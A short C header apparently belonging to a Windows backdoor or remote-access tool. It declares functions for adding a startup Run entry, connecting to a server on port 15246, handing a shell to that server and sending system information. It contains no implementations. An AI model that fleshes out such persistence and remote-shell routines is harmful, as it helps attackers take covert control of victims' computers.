#ifndef MAIN_H_INCLUDED
#define MAIN_H_INCLUDED


#define PORT 15246
#define BUFFERSIZE 256
#define SEND 0
#define RECV 1
#define SUCCESS 0

#define VISTA TEXT("Vista")
#define WIN7  TEXT("Windows 7")
#define Win2K8 TEXT("Windows Server 2008")
typedef void (WINAPI *PGETSYSTEMINFO)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *PGETPRODUCTINFO)(DWORD, DWORD, DWORD, DWORD, PDWORD);


int addRunEntry(char *name,const char *path);
int connect_to_server(const char* addr);
void shell_to_server(int fd);
void command(int fd);
void sendInfo(int fd);
int receipt_confirmation(int sock,int check);
bool startsWith(const char *pre, const char *str);
#endif // MAIN_H_INCLUDED
